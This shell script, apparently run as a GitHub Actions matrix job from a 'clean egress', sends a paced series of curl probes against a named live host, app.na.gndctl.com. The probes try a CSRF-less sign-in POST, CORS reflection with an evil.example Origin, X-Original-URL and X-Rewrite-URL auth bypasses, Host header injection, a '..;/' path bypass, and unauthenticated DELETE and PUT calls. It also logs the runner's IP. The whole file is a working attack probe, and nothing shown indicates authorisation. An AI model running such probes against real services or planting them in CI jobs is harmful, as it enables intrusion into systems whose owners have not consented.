#!/bin/sh
# Probe app.na.gndctl.com from a clean egress (GitHub Actions runner).
# Matrix runs node 18/20/22 -> only run on node 18 to keep request volume low (>=2s pacing).
set -u
case "$(node -v 2>/dev/null)" in
  v18*) ;;
  *) echo "skip: matrix job $(node -v 2>/dev/null)"; exit 0 ;;
esac

T="https://app.na.gndctl.com"
J() { curl -sS -m 25 -D- -o /dev/null "$@" 2>&1 || echo "CURL_FAIL $?"; echo "----"; }
P() { sleep 2; }

echo "### RUNNER EGRESS IP"
curl -sS -m 15 https://api.ipify.org || true
echo ""
echo "### 1 health status+headers"
J "$T/api/health"
P
echo "### 2 login page headers"
J "$T/login"
P
echo "### 3 GET signin/keycloak (-L final url)"
curl -sS -m 25 -D- -o /dev/null -L -w 'final_url=%{url_effective} code=%{http_code}\n' "$T/api/auth/signin/keycloak" 2>&1 || echo "CURL_FAIL $?"
echo "----"
P
echo "### 4 POST signin/keycloak (no csrf)"
J -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data 'csrfToken=x&callbackUrl=/dashboard&json=true' "$T/api/auth/signin/keycloak"
P
echo "### 5 OPTIONS + Origin (CORS preflight on /api/meta)"
J -X OPTIONS -H 'Origin: https://evil.example' -H 'Access-Control-Request-Method: POST' "$T/api/meta"
P
echo "### 6 GET /api/meta with Origin (CORS reflection?)"
J -H 'Origin: https://evil.example' "$T/api/meta"
P
echo "### 7 GET /api/meta Accept: application/json (middleware accept bypass?)"
J -H 'Accept: application/json' "$T/api/meta"
P
echo "### 8 GET /api/inspection/submit Accept: application/json"
J -H 'Accept: application/json' "$T/api/inspection/submit"
P
echo "### 9 X-Original-URL / X-Rewrite-URL bypass on /login"
J -H 'X-Original-URL: /api/inspection/submit' "$T/login"
P
J -H 'X-Rewrite-URL: /api/meta' "$T/login"
P
echo "### 10 DELETE on /api/inspection/submit"
J -X DELETE "$T/api/inspection/submit"
P
echo "### 11 PUT on /api/meta"
J -X PUT -H 'Content-Type: application/json' --data '{}' "$T/api/meta"
P
echo "### 12 Host header injection on /login"
curl -sS -m 25 -D- -o /dev/null -H 'Host: evil.example' "$T/login" 2>&1 || echo "CURL_FAIL $?"
echo "----"
P
echo "### 13 raw path /api/inspection/submit..;/"
curl -sS -m 25 -D- -o /dev/null --path-as-is "$T/api/inspection/submit..;/" 2>&1 || echo "CURL_FAIL $?"
echo "----"
P
echo "### 14 GET /api/auth/session with Origin"
J -H 'Origin: https://evil.example' "$T/api/auth/session"
echo "### DONE"
